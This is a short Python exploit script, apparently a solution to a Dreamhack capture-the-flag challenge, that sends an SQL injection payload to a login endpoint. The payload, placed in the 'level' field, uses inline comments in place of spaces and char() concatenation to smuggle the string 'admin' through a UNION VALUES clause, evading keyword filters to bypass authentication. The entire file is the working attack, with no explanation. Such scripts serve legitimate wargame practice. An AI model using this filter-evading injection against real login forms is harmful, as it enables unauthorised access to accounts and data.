import requests

URL = 'http://host3.dreamhack.games:21299/login'
PAYLOAD = '0/**/union/**/values(char(0x61)||char(0x64)||char(0x6D)||char(0x69)||char(0x6E))'
DATA = {'uid':'', 'upw':'', 'level':PAYLOAD}

resp = requests.post(URL, DATA)

print(resp.text)